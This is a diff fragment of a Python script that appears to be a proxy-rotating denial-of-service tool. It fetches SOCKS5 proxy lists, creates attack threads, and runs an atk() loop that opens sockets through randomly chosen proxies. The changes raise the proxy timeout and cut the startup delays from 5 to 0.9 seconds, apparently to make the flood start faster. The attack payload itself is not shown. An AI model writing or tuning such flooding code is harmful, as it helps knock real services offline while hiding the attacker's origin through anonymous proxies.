@@ -156,7 +156,7 @@ def opth():
 		print('[✓] Threads ' + str(g+1) + " Created ")
 
 def clone(): 
-	r = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&anonymity=all&timeout=2000')
+	r = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&anonymity=all&timeout=2800')
 	with open('socks5.txt','wb') as f:
 		f.write(r.content)
 		print('[✓] Sucess Get List !')
@@ -200,7 +200,7 @@ def main():
 		lst = 'socks5.txt'
 	lsts = open(lst).readlines()
 	print('[+] Total Socks5 : %d'%len(lsts))
-	time.sleep(5)
+	time.sleep(0.9)
 	opth()
 	
 
@@ -210,7 +210,7 @@ def atk():
 	proxy = random.choice(lsts).strip().split(":")
 	accept = random.choice(acpt)
 	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]))
-	time.sleep(5)
+	time.sleep(0.9)
 	while True:
 		try:
 			s = socks.socksocket()
